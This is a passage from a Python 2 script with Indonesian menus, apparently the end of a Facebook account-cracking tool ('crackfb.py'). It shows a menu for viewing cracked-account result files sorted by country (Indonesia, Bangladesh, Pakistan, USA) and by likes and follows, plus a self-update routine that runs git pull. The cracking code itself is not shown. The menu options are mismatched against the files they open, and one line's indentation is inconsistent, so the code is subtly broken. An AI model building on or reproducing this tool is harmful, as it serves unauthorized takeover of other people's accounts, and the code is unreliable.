	print ('\033[0;97m   2. \033[0;97mLihat Hasil Crack Bangladesh')
	print ('\033[0;97m   3. \033[0;97mLihat Hasil Crack Pakistan')
	print ('\033[0;97m   4. \033[0;97mLihat Hasil Crack Usa')
	print ('\033[0;97m   5. \033[0;97mLihat Hasil Crack Like')
	print ('\033[0;97m   6. \033[0;97mLihat Hasil Crack Follow')
	print ('\033[0;97m   0. \033[0;97mKembali')
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
	pilih_hasil()
	
### PILIH HASIL ###
def pilih_hasil():
	keak = raw_input('\033[0;97m   >\033[0;97m ')
	if keak =="":
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_hasil()
	elif keak =="1":
		os.system('xdg-open done/indo.txt')
		hasil_crack()
	elif keak =="2":
		os.system('xdg-open done/bangla.txt')
		hasil_crack()
	elif keak =="3":
		os.system('xdg-open done/bangla.txt')
		hasil_crack()
	elif keak =="4":
		os.system('xdg-open done/pakis.txt')
		hasil_crack()
	elif keak =="5":
		os.system('xdg-open done/usa.txt')
		hasil_crack()
	elif keak =="6":
		os.system('xdg-open done/like.txt')
		hasil_crack()
	elif keak =="7":
		os.system('xdg-open done/follow.txt')
		hasil_crack()
	elif keak =="0":
		menu()
	else:
		print '\033[0;97m   Isi Yg Benar'
		
### PERBARUI SCRIPT ###
def perbarui():
	os.system("clear")
	print logo
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	jalan ("\033[0;97m   Memperbarui Script ...\033[0;97m")
        print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
	os.system("git pull origin master")
	raw_input("\n\033[0;97m   <\033[0;97m Kembali \033[0;97m>")
	os.system("python2 crackfb.py")

if __name__=='__main__':
	menu()
	masuk()
